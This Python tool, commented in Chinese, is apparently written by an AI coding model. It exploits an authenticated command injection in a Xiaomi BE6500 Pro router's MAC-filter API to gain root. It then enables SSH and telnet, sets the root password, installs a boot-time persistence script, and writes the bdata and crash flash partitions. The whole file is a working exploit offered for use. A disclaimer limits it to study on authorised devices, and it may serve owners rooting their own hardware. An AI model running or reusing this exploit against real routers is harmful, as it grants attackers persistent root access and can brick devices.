#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================
 小米路由器 BE6500 Pro (RD08, 固件 1.1.96) SSH 工具
==============================================================
 原理: /api/xqsystem/set_macfilter_rules 的 name 参数命令注入
       (hackCheck 白名单参数 + 无 cmdSafeCheck + 无引号拼接)
 声明: 本工具由月之暗面 K3 模型(Kimi Code)实现, 仅供学习研究,
       请勿用于未经授权的设备。
==============================================================

依赖: pip install requests ssh2-python
"""

import sys, os, time, socket, random, hashlib, re

try:
    import requests
except ImportError:
    sys.exit('缺少依赖: pip install requests')

# ---------------------------------------------------------------- 基础工具

if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stdin.reconfigure(encoding='utf-8')
    except Exception:
        pass

def _hidden_input(prompt):
    """Windows 下用 msvcrt 实现密码隐藏输入, 避免 getpass 在 MinTTY 下报警"""
    import msvcrt
    sys.stdout.write(prompt)
    sys.stdout.flush()
    buf = []
    while True:
        ch = msvcrt.getwch()
        if ch in ('\r', '\n'):
            sys.stdout.write('\n')
            break
        if ch == '\x03':            # Ctrl+C
            raise KeyboardInterrupt
        if ch == '\x08':            # Backspace
            if buf:
                buf.pop()
            continue
        if ch in ('\x00', '\xe0'):  # 功能键, 吞掉后续扫描码
            msvcrt.getwch()
            continue
        buf.append(ch)
    return ''.join(buf)

def ask(prompt, default=None, secret=False):
    """带默认值的输入提示"""
    tip = f'{prompt} [{default}]: ' if default is not None else f'{prompt}: '
    try:
        if secret and sys.stdin.isatty():
            if sys.platform == 'win32':
                v = _hidden_input(tip)
            else:
                import getpass
                v = getpass.getpass(tip)
        else:
            v = input(tip)
    except (EOFError, KeyboardInterrupt):
        print('\n已取消')
        sys.exit(0)
    v = v.strip()
    return v if v else default

def confirm(prompt, default=False):
    v = ask(f'{prompt} (y/n)', 'y' if default else 'n')
    return v.lower() in ('y', 'yes', '是')

def tcp_open(ip, port, timeout=2):
    try:
        socket.create_connection((ip, port), timeout=timeout).close()
        return True
    except OSError:
        return False

# ---------------------------------------------------------------- Web 登录 & 漏洞利用

class RouterWeb:
    def __init__(self, ip, password):
        self.ip = ip
        self.password = password
        self.stok = None
        self.s = requests.Session()

    def login(self):
        ip = self.ip
        page = self.s.get(f'http://{ip}/cgi-bin/luci/web', timeout=5).text
        mac = re.search(r"var deviceId = '(.*?)'", page).group(1)
        key = re.search(r"key: '(.*?)',", page).group(1)
        nonce = f"0_{mac}_{int(time.time())}_{random.randint(1000, 10000)}"
        info = self.s.get(f'http://{ip}/cgi-bin/luci/api/xqsystem/init_info', timeout=5).json()
        h = hashlib.sha256 if str(info.get('newEncryptMode')) == '1' else hashlib.sha1
        pwd = h((nonce + h((self.password + key).encode()).hexdigest()).encode()).hexdigest()
        r = self.s.post(f'http://{ip}/cgi-bin/luci/api/xqsystem/login',
                        data={'username': 'admin', 'password': pwd, 'logtype': '2',
                              'nonce': nonce}, timeout=5).json()
        if r.get('code') != 0:
            raise RuntimeError(f'管理密码登录失败: {r}')
        self.stok = r['token']
        return info

    def rce(self, mac, cmd):
        """通过 macfilter name 注入执行命令。payload 不能含 ';'。"""
        name = f'x$({cmd})y'
        assert ';' not in name, 'payload 不能含分号'
        r = self.s.post(
            f'http://{self.ip}/cgi-bin/luci/;stok={self.stok}/api/xqsystem/set_macfilter_rules',
            data={'mac': mac, 'name': name, 'option': 'add', 'wan': ''}, timeout=20)
        return r.json().get('code') == 0

    def macfilter_del(self, mac):
        self.s.post(
            f'http://{self.ip}/cgi-bin/luci/;stok={self.stok}/api/xqsystem/set_macfilter_rules',
            data={'mac': mac, 'name': 'x', 'option': 'del', 'wan': ''}, timeout=8)

# ---------------------------------------------------------------- SSH / Telnet 执行

class SSH:
    def __init__(self, ip, user, password):
        from ssh2.session import Session
        self.sock = socket.create_connection((ip, 22), timeout=5)
        self.s = Session()
        self.s.handshake(self.sock)
        self.s.userauth_password(user, password)

    def run(self, cmd, timeout=30):
        ch = self.s.open_session()
        ch.execute(cmd)
        out = b''
        while True:
            try:
                n, data = ch.read()
            except Exception:
                break
            if n <= 0:
                break
            out += data
        return out.decode(errors='replace')

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass

class Telnet:
    """应急通道: 重启后 dropbear 未启动时用 (nvram telnet_en=1)"""
    def __init__(self, ip, user, password):
        self.s = socket.create_connection((ip, 23), timeout=5)
        self.s.settimeout(3)
        self._read(2)
        self.s.sendall(user.encode() + b'\n'); self._read(1)
        self.s.sendall(password.encode() + b'\n')
        banner = self._read(2)
        if b'Login incorrect' in banner:
            raise RuntimeError('telnet 登录失败')

    def _read(self, t=1.0):
        buf = b''
        end = time.time() + t
        while time.time() < end:
            try:
                d = self.s.recv(4096)
                if not d:
                    break
                buf += d
            except socket.timeout:
                break
        return buf

    def run(self, cmd, timeout=15):
        self.s.sendall(cmd.encode() + b'; echo __D__\n')
        out = b''
        end = time.time() + timeout
        while time.time() < end and b'__D__' not in out.split(cmd.encode())[-1]:
            out += self._read(1)
        return out.decode(errors='replace')

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass

def get_shell(ip, password, tries=1):
    """优先 SSH, 失败回退 Telnet"""
    last = None
    for _ in range(tries):
        try:
            return SSH(ip, 'root', password)
        except Exception as e:
            last = e
        try:
            return Telnet(ip, 'root', password)
        except Exception as e:
            last = e
        time.sleep(2)
    raise RuntimeError(f'SSH/Telnet 均无法登录: {last}')

# ---------------------------------------------------------------- 功能 1: 开启临时 SSH

def enable_ssh(web, rootpw):
    base = random.randint(0x10, 0xD0)
    macs = [f'0A:11:22:33:44:{base + i:02X}' for i in range(3)]
    steps = [
        ('写入 nvram ssh_en=1', 'nvram set ssh_en=1 && nvram set telnet_en=1 && nvram commit'),
        ('修改 dropbear 并启动', 'sed -i "s/channel=.*/channel=\\"debug\\"/g" /etc/init.d/dropbear && /etc/init.d/dropbear start'),
        (f'设置 root 密码为 {rootpw}', f'echo -e "{rootpw}\\n{rootpw}" | passwd root'),
    ]
    try:
        for i, (desc, cmd) in enumerate(steps):
            print(f'  [{i+1}/3] {desc} ...')
            if not web.rce(macs[i], cmd):
                print('  注入请求被拒绝, 可能固件已修复')
                return False
        time.sleep(2)
        return tcp_open(web.ip, 22)
    finally:
        for m in macs:
            web.macfilter_del(m)

# ---------------------------------------------------------------- 功能 2: 软固化 (开机自启)

AUTO_SSH = """#!/bin/sh
# auto_ssh: 每次开机重新放开 dropbear (nvram ssh_en 已持久, 只需修 channel)
sleep 5
sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear
/etc/init.d/dropbear restart
"""

def _install_auto_ssh(sh):
    """通过已有 shell 安装 auto_ssh 开机自启 (base64 传输避免引号问题)"""
    import base64
    b64 = base64.b64encode(AUTO_SSH.encode()).decode()
    for c in [
        'mkdir -p /data/auto_ssh',
        f'echo {b64} | base64 -d > /data/auto_ssh/auto_ssh.sh',
        'chmod +x /data/auto_ssh/auto_ssh.sh',
        "uci set firewall.auto_ssh=include",
        "uci set firewall.auto_ssh.type='script'",
        "uci set firewall.auto_ssh.path='/data/auto_ssh/auto_ssh.sh'",
        "uci set firewall.auto_ssh.enabled='1'",
        "uci commit firewall",
    ]:
        sh.run(c)

def soft_persist(ip, rootpw):
    sh = get_shell(ip, rootpw)
    try:
        _install_auto_ssh(sh)
        out = sh.run('uci get firewall.auto_ssh.path')
        return 'auto_ssh.sh' in out
    finally:
        sh.close()

# ---------------------------------------------------------------- 功能 3: 深度固化 (bdata/crash, 三次重启)

def wait_router_down(ip):
    print('  等待路由器重启 ...', flush=True)
    time.sleep(5)
    for _ in range(12):  # 最多等 ~60s 让端口先关掉
        if not tcp_open(ip, 22) and not tcp_open(ip, 80):
            return True
        time.sleep(5)
    return False

def wait_router_up(ip, rootpw, timeout=420):
    print('  等待路由器上线 ...', flush=True)
    end = time.time() + timeout
    while time.time() < end:
        if tcp_open(ip, 80):
            try:
                sh = get_shell(ip, rootpw)
                return sh
            except Exception:
                pass
        time.sleep(6)
    raise RuntimeError('等待超时, 路由器未恢复。请手动检查路由器状态后再继续。')

def deep_persist(ip, rootpw):
    print('''
  [深度固化步骤说明]
  第 1 步: 向 crash 分区写入 magic, 使 bootloader 进入调试引导 -> 自动重启
  第 2 步: 将 ssh_en/telnet_en/uart_en/boot_wait 写入 bdata (抗恢复出厂) -> 自动重启
  第 3 步: 擦除 crash 分区, 恢复正常引导 -> 自动重启, 固化完成
''')
    if not confirm('  准备就绪, 开始第 1 步?'):
        return False

    sh = get_shell(ip, rootpw)
    sh.run("zz=$(dd if=/dev/zero bs=1 count=2 2>/dev/null) ; printf '\\xA5\\x5A%c%c' $zz $zz | mtd write - crash")
    sh.run('reboot')
    sh.close()
    wait_router_down(ip)
    sh = wait_router_up(ip, rootpw)

    print('  [第 2 步] 写入 bdata ...')
    sh.run('nvram set ssh_en=1 && nvram set telnet_en=1 && nvram set uart_en=1 && nvram set boot_wait=on && nvram commit')
    sh.run('bdata set ssh_en=1 && bdata set telnet_en=1 && bdata set uart_en=1 && bdata set boot_wait=on && bdata commit')
    sh.run('reboot')
    sh.close()
    wait_router_down(ip)
    sh = wait_router_up(ip, rootpw)

    print('  [第 3 步] 擦除 crash ...')
    sh.run('mtd erase crash')
    sh.run('reboot')
    sh.close()
    wait_router_down(ip)
    sh = wait_router_up(ip, rootpw)

    # 调试引导循环会清空 /data 和 overlay 配置, 需重新开启 dropbear 并重装 auto_ssh
    print('  [收尾] 恢复 dropbear 并重装 auto_ssh 自启 ...')
    sh.run('sed -i \'s/channel=.*/channel="debug"/g\' /etc/init.d/dropbear && /etc/init.d/dropbear start')
    _install_auto_ssh(sh)
    sh.close()
    return True

# ---------------------------------------------------------------- 主流程

BANNER = '''
==============================================================
 小米 BE6500 Pro (RD08 @ 1.1.96) SSH 工具
 漏洞: set_macfilter_rules name 参数注入 (认证后 RCE)
 声明: 月之暗面 K3 模型实现, 仅供学习研究, 勿用于未授权设备
==============================================================
'''

def main():
    print(BANNER)
    ip = ask('路由器 IP', '192.168.31.1')
    if not tcp_open(ip, 80):
        sys.exit(f'[!] 无法连接 {ip}, 请确认电脑与路由器在同一网络')

    webpw = ask('路由器管理密码 (Web 后台密码)', secret=True)
    rootpw = ask('要设置的 SSH root 密码', 'admin')

    web = RouterWeb(ip, webpw)
    try:
        info = web.login()
    except Exception as e:
        sys.exit(f'[!] 登录失败: {e}')
    print(f'\n[+] 登录成功: {info.get("displayName", "?")} / 固件 {info.get("romversion", "?")}')

    while True:
        ssh_on = tcp_open(ip, 22)
        print('\n---------------- 菜单 ----------------')
        print(f'  当前 SSH 状态: {"已开启" if ssh_on else "未开启"}')
        print('  1 - 开启 SSH (漏洞利用, 重启后失效)')
        print('  2 - 固化 SSH (软固化: 开机自启脚本, 需 SSH 已开启)')
        print('  3 - 深度固化 (bdata/crash 分区, 三次重启, 抗固件升级)')
        print('  0 - 退出')
        choice = ask('请选择', '1' if not ssh_on else '0')

        if choice == '0':
            break
        elif choice == '1':
            print('\n[!] 即将对路由器执行命令注入以开启 SSH (root 权限)。')
            print('    该操作不修改任何分区, 重启后失效, 但理论上存在极小风险。')
            if not confirm('确认要开启 SSH 吗?'):
                continue
            if enable_ssh(web, rootpw):
                print(f'\n[+] SSH 已开启: ssh root@{ip}  密码: {rootpw}')
            else:
                print('\n[-] SSH 端口未开放, 注入可能已被修复')
        elif choice == '2':
            print('\n[!] 软固化: 在 /data/auto_ssh 安装开机自启脚本 (uci firewall include)。')
            print('    不碰系统分区, 可用 uci delete firewall.auto_ssh 卸载, 安全可逆。')
            if not confirm('确认进行软固化?'):
                continue
            try:
                if soft_persist(ip, rootpw):
                    print('[+] 软固化完成, 重启后 SSH 将自动开启')
                else:
                    print('[-] 校验失败, 请手动检查')
            except Exception as e:
                print(f'[-] 失败: {e}')
        elif choice == '3':
            print('\n[!!] 深度固化会写入 bdata/crash 分区并三次重启路由器!')
            print('     建议先备份全部分区 (xmir-patcher 菜单 4)。出错可用')
            print('     小米官方修复工具 + 备份恢复。')
            if not confirm('我已了解风险并已完成备份, 确认继续?', default=False):
                continue
            try:
                if deep_persist(ip, rootpw):
                    print('[+] 深度固化完成! 固件升级/恢复出厂后 SSH/telnet 仍可恢复')
            except Exception as e:
                print(f'[-] 中断: {e}')
        else:
            print('无效选择')

    print('再见。')

if __name__ == '__main__':
    main()
